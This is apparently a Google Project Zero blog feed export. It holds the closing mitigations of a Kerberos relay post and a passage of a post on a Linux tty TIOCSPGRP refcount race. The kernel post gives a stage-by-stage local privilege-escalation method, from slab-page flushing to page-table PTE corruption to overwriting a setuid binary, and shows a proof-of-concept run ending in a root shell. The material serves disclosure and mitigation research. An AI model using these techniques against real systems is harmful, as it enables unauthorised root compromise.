 <p class="c0"><span class="c3">For TLS encapsulated protocols, channel binding prevents the authentication being relayed as I didn&#39;t find any way of spoofing the TLS certificate at the same time. If the network service supports EPA, such as HTTPS or LDAPS it should be enabled. Even if the protocol doesn&#39;t support EPA, enabling TLS protection if possible is still valuable. This not only provides more robust server authentication, which Kerberos mutual authentication doesn&#39;t really provide, it&#39;ll also hide Kerberos authentication tokens from sniffing or MitM attacks.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>Some libraries, such as WinHTTP and .NET set the undocumented </span><span class="c4">ISC_REQ_UNVERIFIED_TARGET_NAME</span><span>&nbsp;request attribute when calling </span><span class="c4">InitializeSecurityContext</span><span>&nbsp;in certain circumstances</span><span class="c3">. This affects the behavior of the server when querying for the SPN used during authentication. Some servers such as SMB and IIS with EPA can be configured to validate the SPN. If this request attribute flag is set then while the authentication will succeed when the server goes to check the SPN, it gets an empty string which will not match the server&#39;s expectations. If you&#39;re a developer you should use this flag if the SPN has been provided from an untrustworthy source, although this will only be beneficial if the server is checking the received SPN.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">A common thread through the research is abusing local DNS resolution to spoof the SPN. Disabling LLMNR and MDNS should always be best practice, and this just highlights the dangers of leaving them enabled. While it might be possible to perform the same attacks through DNS spoofing attacks, these are likely to be much less reliable than local DNS spoofing attacks.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">If Windows authentication isn&#39;t needed from a network client, it&#39;d be wise to disable it if supported. For example, some HTTP user agents support disabling automatic Windows authentication entirely, while others such as Firefox don&#39;t enable it by default. Chromium also supports disabling the DNS lookup process for generating the SPN through group policy.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">Finally, blocking untrusted devices on the network such as through 802.1X or requiring authenticated IPsec/IKEv2 for all network communications to high value services would go some way to limiting the impact of all authentication relay attacks. Although of course, an attacker could still compromise a trusted host and use that to mount the attack.</span></p><h2 class="c26" id="h.lhddftsoy07y"><span class="c6 c19">Conclusions</span></h2>
 <p class="c0"><span class="c3">I hope that this blog post has demonstrated that Kerberos relay attacks are feasible and just disabling NTLM is not a sufficient mitigation strategy in an enterprise environment. While DNS is a common thread and is the root cause of the majority of these protocol issues, it&#39;s still possible to spoof SPNs using other protocols such as AuthIP and MSRPC without needing to play DNS tricks.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>While I wrote my own tooling to perform the LLMNR attack there are various public tools which can mount an LLMNR and MDNS spoofing attack such as the venerable </span><span class="c8"><a class="c51" href="https://github.com/SpiderLabs/Responder">Python Responder</a></span><span class="c3">. It shouldn&#39;t be hard to modify one of the tools to verify my findings.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">I&#39;ve also not investigated every possible network protocol which might perform Kerberos authentication. I&#39;ve also not looked at non-Windows systems which might support Kerberos such as Linux and macOS. It&#39;s possible that in more heterogeneous networks the impact might be more pronounced as some of the security changes in Microsoft&#39;s Kerberos implementation might not be present.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span class="c3">If you&#39;re doing your own research into this area, you should look at how the SPN is specified by the protocol, but also how the implementation builds it. For example the HTTP Negotiate RFC states how to build the SPN for Kerberos, but then each implementation does it slightly differently and not to the RFC specification.</span></p>
 <p class="c0 c9"><span class="c3"></span></p>
 <p class="c0"><span>You should be especially wary of any protocol where an untrusted server can specify an arbitrary SPN. This is the case in AuthIP, MSRPC and DCOM. It&#39;s almost certain that when these protocols were originally designed many years ago, that no thought was given to the possible abuse of this design for relaying the Kerberos network authentication. </span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/6510029969921067809/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6510029969921067809
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6510029969921067809
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
## @title
Using Kerberos for Authentication Relay Attacks
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s72-c
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-8464515825658328843
## published
19/10/2021 13:08:00
## updated
19/10/2021 13:08:55
## title
## @type
text
## #text
 How a simple Linux kernel memory corruption bug can lead to complete system compromise
## content
## @type
html
## #text
<style>
  .markdown-body pre {
    padding: 16px;
    overflow: auto;
    font-size: 85%;
    line-height: 1.45;
    background-color: #e2e2e2;
    border-radius: 3px;
    font-family: Consolas, monospace;
  }
</style>
<div id="out" class="markdown-body">
  <h3 style='font-weight: normal; font-style: italic;'>An analysis of current and potential kernel security mitigations</h3>
  <p>Posted by Jann Horn, Project Zero</p>
  <h1>Introduction</h1>
<p>This blog post describes a straightforward Linux kernel locking bug and how I exploited it against Debian Buster's 4.19.0-13-amd64 kernel. Based on that, it explores options for security mitigations that could prevent or hinder exploitation of issues similar to this one.</p>
<p>I hope that stepping through such an exploit and sharing this compiled knowledge with the wider security community can help with reasoning about the relative utility of various mitigation approaches.</p>
<p>A lot of the individual exploitation techniques and mitigation options that I am describing here aren't novel. However, I believe that there is value in writing them up together to show how various mitigations interact with a fairly normal use-after-free exploit.</p>
<p>Our bugtracker entry for this bug, along with the proof of concept, is at <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2125">https://bugs.chromium.org/p/project-zero/issues/detail?id=2125</a>.</p>
<p>Code snippets in this blog post that are relevant to the exploit are taken from the upstream 4.19.160 release, since that is what the targeted Debian kernel is based on; some other code snippets are from mainline Linux.</p>
<p>(In case you're wondering why the bug and the targeted Debian kernel are from end of last year: I already wrote most of this blogpost around April, but only recently finished it)</p>
<p>I would like to thank <a href="https://twitter.com/lunixbochs">Ryan Hileman</a> for a discussion we had a while back about how static analysis might fit into static prevention of security bugs (but note that Ryan hasn't reviewed this post and doesn't necessarily agree with any of my opinions). I also want to thank <a href="https://twitter.com/kees_cook">Kees Cook</a> for providing feedback on an earlier version of this post (again, without implying that he necessarily agrees with everything), and my Project Zero colleagues for reviewing this post and frequent discussions about exploit mitigations.</p>
<h1>Background for the bug</h1>
<p>On Linux, terminal devices (such as a serial console or a <a href="https://en.wikipedia.org/wiki/Virtual_console">virtual console</a>) are represented by a <code>struct tty_struct</code>. Among other things, this structure contains fields used for the <a href="https://www.gnu.org/software/libc/manual/html_node/Job-Control.html">job control</a> features of terminals, which are usually modified using <a href="https://man7.org/linux/man-pages/man4/tty_ioctl.4.html">a set of ioctls</a>:</p>
<pre><code>struct tty_struct {
[...]
        spinlock_t ctrl_lock;
[...]
        struct pid *pgrp;               /* Protected by ctrl lock */
        struct pid *session;
[...]
        struct tty_struct *link;
[...]
}[...];
</code></pre>
<p>The <code>pgrp</code> field points to the foreground process group of the terminal (normally modified from userspace via the <code>TIOCSPGRP</code> ioctl); the <code>session</code> field points to the session associated with the terminal. Both of these fields do not point directly to a process/task, but rather to a <code>struct pid</code>. <code>struct pid</code> ties a specific incarnation of a numeric ID to a set of processes that use that ID as their PID (also known in userspace as TID), TGID (also known in userspace as PID), PGID, or SID. You can kind of think of it as a weak reference to a process, although that's not entirely accurate. (There's some extra nuance around <code>struct pid</code> when <code>execve()</code> is called by a non-leader thread, but that's irrelevant here.)</p>
<p>All processes that are running inside a terminal and are subject to its job control refer to that terminal as their "controlling terminal" (stored in <code>-&gt;signal-&gt;tty</code> of the process).</p>
<p>A special type of terminal device are <a href="https://man7.org/linux/man-pages/man7/pty.7.html">pseudoterminals</a>, which are used when you, for example, open a terminal application in a graphical environment or connect to a remote machine via SSH. While other terminal devices are connected to some sort of hardware, both ends of a pseudoterminal are controlled by userspace, and pseudoterminals can be freely created by (unprivileged) userspace. Every time <a href="https://man7.org/linux/man-pages/man4/pts.4.html"><code>/dev/ptmx</code></a> (short for "pseudoterminal multiplexor") is opened, the resulting file descriptor represents the device side (referred to in documentation and kernel sources as "<a href="https://man7.org/linux/man-pages/man7/pty.7.html">the pseudoterminal master</a>") of a new pseudoterminal . You can read from it to get the data that should be printed on the emulated screen, and write to it to emulate keyboard inputs. The corresponding terminal device (to which you'd usually connect a shell) is automatically created by the kernel under <code>/dev/pts/&lt;number&gt;</code>.</p>
<p>One thing that makes pseudoterminals particularly strange is that both ends of the pseudoterminal have their own <code>struct tty_struct</code>, which point to each other using the <code>link</code> member, even though the device side of the pseudoterminal does not have terminal features like job control - so many of its members are unused.</p>
<p>Many of the ioctls for terminal management can be used on both ends of the pseudoterminal; but no matter on which end you call them, they affect the same state, sometimes with minor differences in behavior. For example, in the ioctl handler for <code>TIOCGPGRP</code>:</p>
<pre><code>/**
 *      tiocgpgrp               -       get process group
 *      @tty: tty passed by user
 *      @real_tty: tty side of the tty passed by the user if a pty else the tty
 *      @p: returned pid
 *
 *      Obtain the process group of the tty. If there is no process group
 *      return an error.
 *
 *      Locking: none. Reference to current-&gt;signal-&gt;tty is safe.
 */
static int tiocgpgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t __user *p)
{
        struct pid *pid;
        int ret;
        /*
         * (tty == real_tty) is a cheap way of
         * testing if the tty is NOT a master pty.
         */
        if (tty == real_tty &amp;&amp; current-&gt;signal-&gt;tty != real_tty)
                return -ENOTTY;
        pid = tty_get_pgrp(real_tty);
        ret =  put_user(pid_vnr(pid), p);
        put_pid(pid);
        return ret;
}
</code></pre>
<p>As documented in the comment above, these handlers receive a pointer <code>real_tty</code> that points to the normal terminal device; an additional pointer <code>tty</code> is passed in that can be used to figure out on which end of the terminal the ioctl was originally called. As this example illustrates, the <code>tty</code> pointer is normally only used for things like pointer comparisons. In this case, it is used to prevent <code>TIOCGPGRP</code> from working when called on the terminal side by a process which does not have this terminal as its controlling terminal.</p>
<p>Note: If you want to know more about how terminals and job control are intended to work, the book <a href="https://man7.org/tlpi/">"The Linux Programming Interface"</a> provides a nice introduction to how these older parts of the userspace API are supposed to work. It doesn't describe any of the kernel internals though, since it's written as a reference for userspace programming. And it's from 2010, so it doesn't have anything in it about new APIs that have showed up over the last decade.</p>
<h1>The bug</h1>
<p>The bug was in the ioctl handler <code>tiocspgrp</code>:</p>
<pre><code>/**
 *      tiocspgrp               -       attempt to set process group
 *      @tty: tty passed by user
 *      @real_tty: tty side device matching tty passed by user
 *      @p: pid pointer
 *
 *      Set the process group of the tty to the session passed. Only
 *      permitted where the tty session is our session.
 *
 *      Locking: RCU, ctrl lock
 */
static int tiocspgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t __user *p)
{
        struct pid *pgrp;
        pid_t pgrp_nr;
[...]
        if (get_user(pgrp_nr, p))
                return -EFAULT;
[...]
        pgrp = find_vpid(pgrp_nr);
[...]
        spin_lock_irq(&amp;tty-&gt;ctrl_lock);
        put_pid(real_tty-&gt;pgrp);
        real_tty-&gt;pgrp = get_pid(pgrp);
        spin_unlock_irq(&amp;tty-&gt;ctrl_lock);
[...]
}
</code></pre>
<p>The <code>pgrp</code> member of the terminal side (<code>real_tty</code>) is being modified, and the reference counts of the old and new process group are adjusted accordingly using <code>put_pid</code> and <code>get_pid</code>; but the lock is taken on <code>tty</code>, which can be either end of the pseudoterminal pair, depending on which file descriptor we pass to <code>ioctl()</code>. So by simultaneously calling the <code>TIOCSPGRP</code> ioctl on both sides of the pseudoterminal, we can cause data races between concurrent accesses to the <code>pgrp</code> member. This can cause reference counts to become skewed through the following races:</p>
<pre><code>  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)
    spin_lock_irq(...)                  spin_lock_irq(...)
    put_pid(old_pid)
                                        put_pid(old_pid)
    real_tty-&gt;pgrp = get_pid(A)
                                        real_tty-&gt;pgrp = get_pid(B)
    spin_unlock_irq(...)                spin_unlock_irq(...)
</code></pre>
<pre><code>  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)
    spin_lock_irq(...)                  spin_lock_irq(...)
    put_pid(old_pid)
                                        put_pid(old_pid)
                                        real_tty-&gt;pgrp = get_pid(B)
    real_tty-&gt;pgrp = get_pid(A)
    spin_unlock_irq(...)                spin_unlock_irq(...)
</code></pre>
<p>In both cases, the refcount of the old <code>struct pid</code> is decremented by 1 too much, and either A's or B's is incremented by 1 too much.</p>
<p>Once you understand the issue, <a href="https://git.kernel.org/linus/54ffccbf053b">the fix</a> seems relatively obvious:</p>
<pre><code>    if (session_of_pgrp(pgrp) != task_session(current))
        goto out_unlock;
    retval = 0;
-   spin_lock_irq(&amp;tty-&gt;ctrl_lock);
+   spin_lock_irq(&amp;real_tty-&gt;ctrl_lock);
    put_pid(real_tty-&gt;pgrp);
    real_tty-&gt;pgrp = get_pid(pgrp);
-   spin_unlock_irq(&amp;tty-&gt;ctrl_lock);
+   spin_unlock_irq(&amp;real_tty-&gt;ctrl_lock);
 out_unlock:
    rcu_read_unlock();
    return retval;
</code></pre>
<h1>Attack stages</h1>
<p>In this section, I will first walk through how my exploit works; afterwards I will discuss different defensive techniques that target these attack stages.</p>
<h2>Attack stage: Freeing the object with multiple dangling references</h2>
<p>This bug allows us to probabilistically skew the refcount of a <code>struct pid</code> down, depending on which way the race happens: We can run colliding <code>TIOCSPGRP</code> calls from two threads repeatedly, and from time to time that will mess up the refcount. But we don't immediately know how many times the refcount skew has actually happened.</p>
<p>What we'd really want as an attacker is a way to skew the refcount deterministically. We'll have to somehow compensate for our lack of information about whether the refcount was skewed successfully. We could try to somehow make the race deterministic (seems difficult), or after each attempt to skew the refcount assume that the race worked and run the rest of the exploit (since if we didn't skew the refcount, the initial memory corruption is gone, and nothing bad will happen), or we can attempt to find an information leak that lets us figure out the state of the reference count.</p>
<p>On typical desktop/server distributions, the following approach works (unreliably, depending on RAM size) for setting up a freed <code>struct pid</code> with multiple dangling references:</p>
<ol>
<li>Allocate a new <code>struct pid</code> (by creating a new task).</li>
<li>Create a large number of references to it (by sending messages with <code>SCM_CREDENTIALS</code> to unix domain sockets, and leaving those messages queued up).</li>
<li>Repeatedly trigger the <code>TIOCSPGRP</code> race to skew the reference count downwards, with the number of attempts chosen such that we expect that the resulting refcount skew is bigger than the number of references we need for the rest of our attack, but smaller than the number of extra references we created.</li>
<li>Let the task owning the <code>pid</code> exit and die, and wait for RCU (read-copy-update, a mechanism that involves delaying the freeing of some objects) to settle such that the task's reference to the <code>pid</code> is gone. (Waiting for an RCU grace period from userspace is not a primitive that is intentionally exposed through the UAPI, but there are various ways userspace can do it - e.g. by testing when a released BPF program's memory is subtracted from memory accounting, or by abusing the <code>membarrier(MEMBARRIER_CMD_GLOBAL, ...)</code> syscall after the kernel version where RCU flavors were unified.)</li>
<li>Create a new thread, and let that thread attempt to drop all the references we created.</li>
</ol>
<p>Because the refcount is smaller at the start of step 5 than the number of references we are about to drop, the <code>pid</code> will be freed at some point during step 5; the next attempt to drop a reference will cause a use-after-free:</p>
<pre><code>struct upid {
        int nr;
        struct pid_namespace *ns;
};

struct pid
{
        atomic_t count;
        unsigned int level;
        /* lists of tasks that use this pid */
        struct hlist_head tasks[PIDTYPE_MAX];
        struct rcu_head rcu;
        struct upid numbers[1];
};
[...]
void put_pid(struct pid *pid)
{
        struct pid_namespace *ns;

        if (!pid)
                return;

        ns = pid-&gt;numbers[pid-&gt;level].ns;
        if ((atomic_read(&amp;pid-&gt;count) == 1) ||
             atomic_dec_and_test(&amp;pid-&gt;count)) {
                kmem_cache_free(ns-&gt;pid_cachep, pid);
                put_pid_ns(ns);
        }
}
</code></pre>
<p>When the object is freed, the SLUB allocator normally replaces the first 8 bytes (sidenote: a different position is chosen starting in 5.7, <a href="https://outflux.net/blog/archives/2020/09/21/security-things-in-linux-v5-7/#v5.7-slub">see Kees' blog</a>) of the freed object with an XOR-obfuscated freelist pointer; therefore, the <code>count</code> and <code>level</code> fields are now effectively random garbage. This means that the load from <code>pid-&gt;numbers[pid-&gt;level]</code> will now be at some random offset from the <code>pid</code>, in the range from zero to 64 GiB. As long as the machine doesn't have tons of RAM, this will likely cause a kernel segmentation fault. (Yes, I know, that's an absolutely gross and unreliable way to exploit this. It mostly works though, and I only noticed this issue when I already had the whole thing written, so I didn't really want to go back and change it... plus, did I mention that it mostly works?)</p>
<p>Linux in its default configuration, and the configuration shipped by most general-purpose distributions, attempts to fix up unexpected kernel page faults and other types of "oopses" by killing only the crashing thread. Therefore, this kernel page fault is actually useful for us as a signal: Once the thread has died, we know that the object has been freed, and can continue with the rest of the exploit.</p>
<p>If this code looked a bit differently and we were actually reaching a double-free, the SLUB allocator would also detect that and trigger a kernel oops (see <code>set_freepointer()</code> for the <code>CONFIG_SLAB_FREELIST_HARDENED</code> case).</p>
<h2>Discarded attack idea: Directly exploiting the UAF at the SLUB level</h2>
<p>On the Debian kernel I was looking at, a <code>struct pid</code> in the initial namespace is allocated from the same <code>kmem_cache</code> as <code>struct seq_file</code> and <code>struct epitem</code> - these three slabs have been merged into one by <code>find_mergeable()</code> to reduce memory fragmentation, since their object sizes, alignment requirements, and flags match:</p>
<pre><code>root@deb10:/sys/kernel/slab# ls -l pid
lrwxrwxrwx 1 root root 0 Feb  6 00:09 pid -&gt; :A-0000128
root@deb10:/sys/kernel/slab# ls -l | grep :A-0000128
drwxr-xr-x 2 root root 0 Feb  6 00:09 :A-0000128
lrwxrwxrwx 1 root root 0 Feb  6 00:09 eventpoll_epi -&gt; :A-0000128
lrwxrwxrwx 1 root root 0 Feb  6 00:09 pid -&gt; :A-0000128
lrwxrwxrwx 1 root root 0 Feb  6 00:09 seq_file -&gt; :A-0000128
root@deb10:/sys/kernel/slab# 
</code></pre>
<p>A straightforward way to exploit a dangling reference to a SLUB object is to reallocate the object through the same <code>kmem_cache</code> it came from, without ever letting the page reach the page allocator. To figure out whether it's easy to exploit this bug this way, I made a table listing which fields appear at each offset in these three data structures (using <code>pahole -E --hex -C &lt;typename&gt; &lt;path to vmlinux debug info&gt;</code>):</p>
<table>
<thead>
<tr>
<th>offset</th>
<th>pid</th>
<th>eventpoll_epi / epitem <strong>(RCU-freed)</strong></th>
<th>seq_file</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>count.counter (4) <strong>(CONTROL)</strong></td>
<td>rbn.__rb_parent_color (8) <strong>(TARGET?)</strong></td>
<td>buf (8) <strong>(TARGET?)</strong></td>
</tr>
<tr>
<td>0x04</td>
<td>level (4)</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0x08</td>
<td>tasks[PIDTYPE_PID] (8)</td>
<td>rbn.rb_right (8) / rcu.func (8)</td>
<td>size (8)</td>
</tr>
<tr>
<td>0x10</td>
<td>tasks[PIDTYPE_TGID] (8)</td>
<td>rbn.rb_left (8)</td>
<td>from (8)</td>
</tr>
<tr>
<td>0x18</td>
<td>tasks[PIDTYPE_PGID] (8)</td>
<td>rdllink.next (8)</td>
<td>count (8)</td>
</tr>
<tr>
<td>0x20</td>
<td>tasks[PIDTYPE_SID] (8)</td>
<td>rdllink.prev (8)</td>
<td>pad_until (8)</td>
</tr>
<tr>
<td>0x28</td>
<td>rcu.next (8)</td>
<td>next (8)</td>
<td>index (8)</td>
</tr>
<tr>
<td>0x30</td>
<td>rcu.func (8)</td>
<td>ffd.file (8)</td>
<td>read_pos (8)</td>
</tr>
<tr>
<td>0x38</td>
<td>numbers[0].nr (4)</td>
<td>ffd.fd (4)</td>
<td>version (8)</td>
</tr>
<tr>
<td>0x3c</td>
<td>[hole] (4)</td>
<td>nwait (4)</td>
<td></td>
</tr>
<tr>
<td>0x40</td>
<td>numbers[0].ns (8)</td>
<td>pwqlist.next (8)</td>
<td>lock (0x20): counter (8)</td>
</tr>
<tr>
<td>0x48</td>
<td>---</td>
<td>pwqlist.prev (8)</td>
<td></td>
</tr>
<tr>
<td>0x50</td>
<td>---</td>
<td>ep (8)</td>
<td></td>
</tr>
<tr>
<td>0x58</td>
<td>---</td>
<td>fllink.next (8)</td>
<td></td>
</tr>
<tr>
<td>0x60</td>
<td>---</td>
<td>fllink.prev (8)</td>
<td>op (8)</td>
</tr>
<tr>
<td>0x68</td>
<td>---</td>
<td>ws (8)</td>
<td>poll_event (4)</td>
</tr>
<tr>
<td>0x6c</td>
<td>---</td>
<td></td>
<td>[hole] (4)</td>
</tr>
<tr>
<td>0x70</td>
<td>---</td>
<td>event.events (4)</td>
<td>file (8)</td>
</tr>
<tr>
<td>0x74</td>
<td>---</td>
<td>event.data (8) <strong>(CONTROL)</strong></td>
<td></td>
</tr>
<tr>
<td>0x78</td>
<td>---</td>
<td></td>
<td>private (8) <strong>(TARGET?)</strong></td>
</tr>
<tr>
<td>0x7c</td>
<td>---</td>
<td>---</td>
<td></td>
</tr>
<tr>
<td>0x80</td>
<td>---</td>
<td>---</td>
<td>---</td>
</tr>
</tbody>
</table>
<p>In this case, reallocating the object as one of those three types didn't seem to me like a nice way forward (although it should be possible to exploit this somehow with some effort, e.g. by using <code>count.counter</code> to corrupt the <code>buf</code> field of <code>seq_file</code>). Also, some systems might be using the <code>slab_nomerge</code> kernel command line flag, which disables this merging behavior.</p>
<p>Another approach that I didn't look into here would have been to try to corrupt the obfuscated SLUB freelist pointer (obfuscation is implemented in <code>freelist_ptr()</code>); but since that stores the pointer in big-endian, <code>count.counter</code> would only effectively let us corrupt the more significant half of the pointer, which would probably be a pain to exploit.</p>
<h2>Attack stage: Freeing the object's page to the page allocator</h2>
<p>This section will refer to some internals of the SLUB allocator; if you aren't familiar with those, you may want to at least look at slides 2-4 and 13-14 of <a href="https://events.static.linuxfound.org/sites/events/files/slides/slaballocators.pdf">Christoph Lameter's slab allocator overview talk from 2014</a>. (Note that that talk covers three different allocators; the SLUB allocator is what most systems use nowadays.)</p>
<p>The alternative to exploiting the UAF at the SLUB allocator level is to flush the page out to the page allocator (also called the buddy allocator), which is the last level of dynamic memory allocation on Linux (once the system is far enough into the boot process that the memblock allocator is no longer used). From there, the page can theoretically end up in pretty much any context. We can flush the page out to the page allocator with the following steps:</p>
<ol>
<li>Instruct the kernel to pin our task to a single CPU. Both SLUB and the page allocator use per-cpu structures; so if the kernel migrates us to a different CPU in the middle, we would fail.</li>
<li>Before allocating the victim <code>struct pid</code> whose refcount will be corrupted, allocate a large number of objects to drain partially-free slab pages of all their unallocated objects. If the victim object (which will be allocated in step 5 below) landed in a page that is already partially used at this point, we wouldn't be able to free that page.</li>
<li>Allocate around <code>objs_per_slab * (1+cpu_partial)</code> objects - in other words, a set of objects that completely fill at least <code>cpu_partial</code> pages, where <code>cpu_partial</code> is the maximum length of the "percpu partial list". Those newly allocated pages that are completely filled with objects are not referenced by SLUB's freelists at this point because SLUB only tracks pages with free objects on its freelists.</li>
<li>Fill <code>objs_per_slab-1</code> more objects, such that at the end of this step, the "CPU slab" (the page from which allocations will be served first) will not contain anything other than free space and fresh allocations (created in this step).</li>
<li>Allocate the victim object (a <code>struct pid</code>). The victim page (the page from which the victim object came) will usually be the CPU slab from step 4, but if step 4 completely filled the CPU slab, the victim page might also be a new, freshly allocated CPU slab.</li>
<li>Trigger the bug on the victim object to create an uncounted reference, and free the object.</li>
<li>Allocate <code>objs_per_slab+1</code> more objects. After this, the victim page will be completely filled with allocations from steps 4 and 7, and it won't be the CPU slab anymore (because the last allocation can not have fit into the victim page).</li>
<li>Free all allocations from steps 4 and 7. This causes the victim page to become empty, but does <em>not</em> free the page; the victim page is placed on the percpu partial list once a single object from that page has been freed, and then stays on that list.</li>
<li>Free one object per page from the allocations from step 3. This adds all these pages to the percpu partial list until it reaches the limit <code>cpu_partial</code>, at which point it will be flushed: Pages containing some in-use objects are placed on SLUB's per-<a href="https://man7.org/linux/man-pages/man7/numa.7.html">NUMA</a>-node partial list, and pages that are completely empty are freed back to the page allocator. (We don't free <em>all</em> allocations from step 3 because we only want the victim page to be freed to the page allocator.) Note that this step requires that every <code>objs_per_slab</code>-th object the allocator gave us in step 3 is on a different page.</li>
</ol>
<p>When the page is given to the page allocator, we benefit from the page being order-0 (4 KiB, native page size): For order-0 pages, the page allocator has special freelists, one per CPU+zone+migratetype combination. Pages on these freelists are not normally accessed from other CPUs, and they don't immediately get combined with adjacent free pages to form higher-order free pages.</p>
<p>At this point we are able to perform use-after-free accesses to some offset inside the free victim page, using codepaths that interpret part of the victim page as a <code>struct pid</code>. Note that at this point, we still don't know exactly at which offset inside the victim page the victim object is located.</p>
<h2>Attack stage: Reallocating the victim page as a pagetable</h2>
<p>At the point where the victim page has reached the page allocator's freelist, it's essentially game over - at this point, the page can be reused as anything in the system, giving us a broad range of options for exploitation. In my opinion, most defences that act after we've reached this point are fairly unreliable.</p>
<p>One type of allocation that is directly served from the page allocator and has nice properties for exploitation are page tables (which have also been <a href="https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html">used to exploit Rowhammer</a>). One way to abuse the ability to modify a page table would be to enable the read/write bit in a page table entry (PTE) that maps a file page to which we are only supposed to have read access - for example, this could be used to gain write access to part of a setuid binary's <code>.text</code> segment and overwrite it with malicious code.</p>
<p>We don't know at which offset inside the victim page the victim object is located; but since a page table is effectively an array of 8-byte-aligned elements of size 8 and the victim object's alignment is a multiple of that, as long as we spray all elements of the victim array, we don't need to know the victim object's offset.</p>
<p>To allocate a page table full of PTEs mapping the same file page, we have to:</p>
<ul>
<li>prepare by setting up a 2MiB-aligned memory region (because each last-level page table describes 2MiB of virtual memory) containing single-page <code>mmap()</code> mappings of the same file page (meaning each mapping corresponds to one PTE); then</li>
<li>trigger allocation of the page table and fill it with PTEs by reading from each mapping</li>
</ul>
<p><code>struct pid</code> has the same alignment as a PTE, and it starts with a 32-bit refcount, so that refcount is guaranteed to overlap the first half of a PTE, which is 64-bit. Because X86 CPUs are little-endian, incrementing the refcount field in the freed <code>struct pid</code> increments the least significant half of the PTE - so it effectively increments the PTE. (Except for the edge case where the least significant half is <code>0xffffffff</code>, but that's not the case here.)</p>
<pre><code>struct pid: count | level |   tasks[0]  |   tasks[1]  |   tasks[2]  | ... 
pagetable:       PTE      |     PTE     |     PTE     |     PTE     | ...
</code></pre>
<p>Therefore we can increment one of the PTEs by repeatedly triggering <code>get_pid()</code>, which tries to increment the refcount of the freed object. This can be turned into the ability to write to the file page as follows:</p>
<ul>
<li>Increment the PTE by 0x42 to set the Read/Write bit and the Dirty bit. (If we didn't set the Dirty bit, the CPU would do it by itself when we write to the corresponding virtual address, so we could also just increment by 0x2 here.)</li>
<li>For each mapping, attempt to overwrite its contents with malicious data and ignore page faults.
<ul>
<li>This might throw spurious errors because of outdated TLB entries, but taking a page fault will automatically evict such TLB entries, so if we just attempt the write twice, this can't happen on the second write (modulo CPU migration, as mentioned above).</li>
<li>One easy way to ignore page faults is to let the kernel perform the memory write using <code>pread()</code>, which will return <code>-EFAULT</code> on fault.</li>
</ul>
</li>
</ul>
<p>If the kernel notices the Dirty bit later on, that might trigger writeback, which could crash the kernel if the mapping isn't set up for writing. Therefore, we have to reset the Dirty bit. We can't reliably decrement the PTE because <code>put_pid()</code> inefficiently accesses <code>pid-&gt;numbers[pid-&gt;level]</code> even when the refcount isn't dropping to zero, but we can increment it by an additional 0x80-0x42=0x3e, which means the final value of the PTE, compared to the initial value, will just have the additional bit 0x80 set, which the kernel ignores.</p>
<p>Afterwards, we launch the setuid executable (which, in the version in the pagecache, now contains the code we injected), and gain root privileges:</p>
<pre><code>user@deb10:~/tiocspgrp$ make
as -o rootshell.o rootshell.S
ld -o rootshell rootshell.o --nmagic
gcc -Wall -o poc poc.c
user@deb10:~/tiocspgrp$ ./poc
starting up...
executing in first level child process, setting up session and PTY pair...
setting up unix sockets for ucreds spam...
draining pcpu and node partial pages
preparing for flushing pcpu partial pages
launching child process
child is 1448
ucreds spam done, struct pid refcount should be lifted. starting to skew refcount...
refcount should now be skewed, child exiting
child exited cleanly
waiting for RCU call...
bpf load with rlim 0x0: -1 (Operation not permitted)
bpf load with rlim 0x1000: 452 (Success)
bpf load success with rlim 0x1000: got fd 452
....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
RCU callbacks executed
gonna try to free the pid...
double-free child died with signal 9 after dropping 9990 references (99%)
hopefully reallocated as an L1 pagetable now
PTE forcibly marked WRITE | DIRTY (hopefully)
clobber via corrupted PTE succeeded in page 0, 128-byte-allocation index 3, returned 856
clobber via corrupted PTE succeeded in page 0, 128-byte-allocation index 3, returned 856
bash: cannot set terminal process group (1447): Inappropriate ioctl for device
bash: no job control in this shell
root@deb10:/home/user/tiocspgrp# id
